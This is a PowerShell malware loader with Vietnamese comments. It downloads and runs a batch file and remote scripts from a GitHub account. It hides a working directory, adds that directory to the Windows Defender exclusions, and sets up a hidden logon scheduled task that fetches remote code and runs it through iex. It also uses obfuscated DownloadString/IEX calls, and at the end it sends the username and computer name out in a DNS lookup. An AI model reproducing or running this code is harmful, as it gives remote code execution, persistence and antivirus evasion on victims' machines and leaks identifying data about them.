



Set-ExecutionPolicy Bypass -Scope Process -Force



$skid = "skid"

# Kiểm tra xem script có quyền quản trị không
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        # Tải xuống tệp batch
        
        $outputFile = "$env:TEMP\download.bat"
        
        # Thực thi tệp batch mà không cần quyền quản trị
        # Lấy mức độ thông báo UAC từ registry
        $uacLevel = Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" | Select-Object -ExpandProperty "ConsentPromptBehaviorAdmin"
        
        # Kiểm tra mức độ UAC và in thông báo
        $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
        Write-Output "Khởi chạy tệp batch."
        
        # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
        Write-Output "Kết thúc tiến trình PowerShell."
        Stop-Process -Id $PID -Force
    }
    catch {
        Write-Error "Lỗi xảy ra: $_"
    }
}

$filePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\windows.cmd"
Set-Content -Path $filePath -Value "exit"

$rdir = "C:\Users\Loader"
$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir

$temp = "$dir\temp"
New-Item -ItemType Directory -Path $temp

Add-MpPreference -ExclusionPath $dir

$task_name = "Windows startup"
$task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -nop -ep bypass -c ""iwr https://raw.githubusercontent.com/43a1723/test/main/download.ps1 -useb | iex"""
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force

Write-Host "[!] Persistence Added" -ForegroundColor Green





$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru

$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/output/antivirus.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru

# if ($env:USERDOMAIN -ne "DESKTOP-A1L2M8J") {
#     $datacode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode2.ps1")
#     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$datacode')"
#     Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
# }





Start-Process -FilePath ""

$u = ("u$env:username" -replace '[^a-zA-Z0-9\-]+', '')[0..63] -join ''
$c = ("c$env:computername" -replace '[^a-zA-Z0-9\-]+', '')[0..63] -join ''
$id = ""
1..8 | ForEach-Object { $id += ([Char[]] "abcdefhijklmnonpqrstuvwxyz0123456789" | Get-Random) }
Resolve-DnsName -Name "$c.UN.$u.CMD.$id.ocsl48dyskzry0kauj0mh8li3.canarytokens.com"

